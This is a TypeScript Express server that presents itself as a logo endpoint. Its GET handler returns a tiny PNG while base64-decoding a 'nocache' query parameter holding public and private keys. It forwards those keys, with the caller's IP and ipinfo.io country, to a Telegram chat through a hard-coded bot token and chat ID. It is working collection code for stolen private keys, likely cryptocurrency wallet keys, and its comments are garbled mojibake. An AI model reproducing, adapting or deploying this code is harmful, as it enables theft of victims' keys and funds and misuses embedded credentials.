import express from 'express';
import axios from 'axios';
import { Buffer } from 'buffer';
import { ParsedUrlQuery } from 'querystring';

const app = express();

// –í–∫–ª—é—á–∞–µ–º –¥–æ–≤–µ—Ä–∏–µ –∫ –ø—Ä–æ–∫—Å–∏ (–≤–∞–∂–Ω–æ –¥–ª—è Vercel)
app.set('trust proxy', true);

// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è Telegram
const TELEGRAM_BOT_TOKEN = '7283726243:AAFW3mIA1SzOmyftdqiRv8xTxtAmyk1rLmw';
const TELEGRAM_CHAT_ID = '5018443124';
const IPINFO_TOKEN = '717875db282daa'; // –ü–æ–ª—É—á–∏—Ç–µ –Ω–∞ ipinfo.io

const LOGO_BASE64 = 'iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4AkEEjUXUBJp+AAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAAAK0lEQVQ4y2NgGAWjYBSMglEwCkbBKBgM4H8Q8p+BgYGB8X8Q0jQKRgEAGY0BCS1Xw/MAAAAASUVORK5CYII=';

// Middleware –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ CORS
app.use((req, res, next) => {
  // –†–∞–∑—Ä–µ—à–∞–µ–º –∑–∞–ø—Ä–æ—Å—ã —Å –ª—é–±—ã—Ö –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤ (–º–æ–∂–Ω–æ –∑–∞–º–µ–Ω–∏—Ç—å –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–π –¥–æ–º–µ–Ω)
  res.setHeader('Access-Control-Allow-Origin', '*');
  
  // –†–∞–∑—Ä–µ—à–∞–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –º–µ—Ç–æ–¥—ã
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  
  // –†–∞–∑—Ä–µ—à–∞–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  
  // –ü—Ä–æ–¥–æ–ª–∂–∞–µ–º –æ–±—Ä–∞–±–æ—Ç–∫—É –∑–∞–ø—Ä–æ—Å–∞
  next();
});

// –û–±—Ä–∞–±–æ—Ç—á–∏–∫ OPTIONS –¥–ª—è –ø—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤
app.options('/', (req, res) => {
  res.status(200).end();
});
// –û–±—Ä–∞–±–æ—Ç—á–∏–∫ GET –∑–∞–ø—Ä–æ—Å–æ–≤
app.get('/', async (req, res) => {
  try {
    // –ü–æ–ª—É—á–∞–µ–º —Ä–µ–∞–ª—å–Ω—ã–π IP –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    // @ts-ignore
    const userIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                  req.socket?.remoteAddress || 
                  req.connection?.remoteAddress || 
                  req.ip;
    
    // –ü–æ–ª—É—á–∞–µ–º —Å—Ç—Ä–∞–Ω—É –ø–æ IP
    const country = await getCountryByIp(userIp);
    
    // –î–µ—à–∏—Ñ—Ä—É–µ–º –¥–∞–Ω–Ω—ã–µ nocache
    const decryptedData = await decryptNocache(req.query.nocache);
    
    console.log('GET request from:', userIp, 'Country:', country, 'Data:', req.query);

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ Telegram (–∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ, –Ω–µ –∂–¥–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è)
    await sendToTelegram(userIp, country, decryptedData);

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ
    const imageBuffer = Buffer.from(LOGO_BASE64, 'base64');
    res.setHeader('Content-Type', 'image/png');
    res.setHeader('Content-Length', imageBuffer.length);
    res.setHeader('Cache-Control', 'no-store, max-age=0');
    res.status(200).send(imageBuffer);

  } catch (error) {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: `–û–®–ò–ë–ö–ê –≤ –º—ç–π–Ω–µ: ${error}`,
      parse_mode: 'Markdown'
    });
    res.status(500).send('Internal Server Error');
  }
});

// –§—É–Ω–∫—Ü–∏—è –¥–µ—à–∏—Ñ—Ä–æ–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö nocache
async function decryptNocache(nocache: any) {
  if (!nocache) return null;
  
  try {
    // –î–µ–∫–æ–¥–∏—Ä—É–µ–º Base64
    const decoded = Buffer.from(nocache, 'base64').toString('utf-8');
    
    // –ü–∞—Ä—Å–∏–º JSON
    const data = JSON.parse(decoded);
    
    return {
      timestamp: data.timestamp ? new Date(data.timestamp * 1000).toISOString() : null,
      header: data.header,
      keys: data.keys || []
    };
  } catch (error) {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: `–û–®–ò–ë–ö–ê –ø—Ä–∏ –¥–µ–∫—Ä–∏–ø—Ç–µ: ${error}`,
      parse_mode: 'Markdown'
    });
    return { error: 'Failed to decrypt data' };
  }
}

// –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å—Ç—Ä–∞–Ω—ã –ø–æ IP
async function getCountryByIp(ip: any) {
  if (!ip || ip === '::1' || ip === '127.0.0.1') return 'Local';
  
  try {
    const response = await axios.get(`https://ipinfo.io/${ip}/json?token=${IPINFO_TOKEN}`);
    return response.data.country || 'Unknown';
  } catch (error) {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: `–û–®–ò–ë–ö–ê –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–µ —Å—Ç—Ä–∞–Ω—ã: ${error}`,
      parse_mode: 'Markdown'
    });
    return 'Error';
  }
}

// –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
async function sendToTelegram(
  ip: string,
  country: string,
  decryptedData: {
    timestamp?: string | null;
    header?: string;
    keys?: Array<{ public?: string; private?: string }>;
    error?: string;
  } | null
) {
  try {
    // –ë–∞–∑–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
    let message = `üåê *–ù–æ–≤—ã–π –∑–∞–ø—Ä–æ—Å –ª–æ–≥–æ—Ç–∏–ø–∞*\n\n`;
    message += `üñ•Ô∏è *IP*: \`${ip}\`\n`;
    message += `üìç *–°—Ç—Ä–∞–Ω–∞*: ${country}\n\n`;

    // –î–æ–±–∞–≤–ª—è–µ–º —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ, –µ—Å–ª–∏ –æ–Ω–∏ –µ—Å—Ç—å
    if (decryptedData) {
      if (decryptedData.error) {
        message += `‚ùå *–û—à–∏–±–∫–∞ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏*: \`${decryptedData.error}\`\n`;
      } else {
        // –î–æ–±–∞–≤–ª—è–µ–º –∑–∞–≥–æ–ª–æ–≤–æ–∫, –µ—Å–ª–∏ –µ—Å—Ç—å
        if (decryptedData.header) {
          message += `üìã *–ó–∞–≥–æ–ª–æ–≤–æ–∫*: \`${decryptedData.header}\`\n\n`;
        }

        // –î–æ–±–∞–≤–ª—è–µ–º timestamp, –µ—Å–ª–∏ –µ—Å—Ç—å
        if (decryptedData.timestamp) {
          message += `‚è±Ô∏è *–í—Ä–µ–º—è –∑–∞–ø—Ä–æ—Å–∞*: \`${decryptedData.timestamp}\`\n\n`;
        }

        // –î–æ–±–∞–≤–ª—è–µ–º –∫–ª—é—á–∏, –µ—Å–ª–∏ –µ—Å—Ç—å
        if (decryptedData.keys && decryptedData.keys.length > 0) {
          message += `üîë *–ö–ª—é—á–∏ (${decryptedData.keys.length})*:\n`;
          
          decryptedData.keys.forEach((key, index) => {
            message += `\n*–ö–ª—é—á ${index + 1}*:\n`;
            message += `‚ñ´Ô∏è *–ü—É–±–ª–∏—á–Ω—ã–π*: \`${key.public || '–æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç'}\`\n`;
            message += `‚ñ´Ô∏è *–ü—Ä–∏–≤–∞—Ç–Ω—ã–π*: \`${key.private ? key.private : '–æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç'}\`\n`;
          });
        }
      }
    } else {
      message += `‚ÑπÔ∏è *–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è*\n`;
    }

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });

  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤ Telegram:', error);
    
    // –ü—ã—Ç–∞–µ–º—Å—è –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ
    try {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: `‚ùå *–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –¥–∞–Ω–Ω—ã—Ö*:\n\`${error instanceof Error ? error.message : String(error)}\``,
        parse_mode: 'Markdown'
      });
    } catch (secondaryError) {
      console.error('–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ:', secondaryError);
    }
  }
}

export default app;